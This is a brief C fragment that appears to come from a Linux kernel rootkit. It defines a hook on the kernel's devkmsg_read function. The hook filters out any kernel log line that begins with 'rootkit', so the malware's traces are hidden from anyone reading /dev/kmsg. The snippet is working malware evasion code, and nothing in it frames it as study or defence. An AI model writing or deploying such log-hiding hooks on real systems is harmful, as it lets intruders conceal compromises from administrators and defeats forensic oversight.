static ssize_t (*orig_devkmsg_read)(struct file *file, char __user *buf,size_t count, loff_t *ppos);

static ssize_t rk_devkmsg_read(struct file *file, char __user *buf,size_t count, loff_t *ppos) {

	ssize_t ret = orig_devkmsg_read(file, buf, count, ppos);

	if (file_check_prefix_suffix(buf, ret, "rootkit" , "\n") == 1)
		ret = hide_file_content(buf, ret, "rootkit" , "\n" );
	return ret;
}
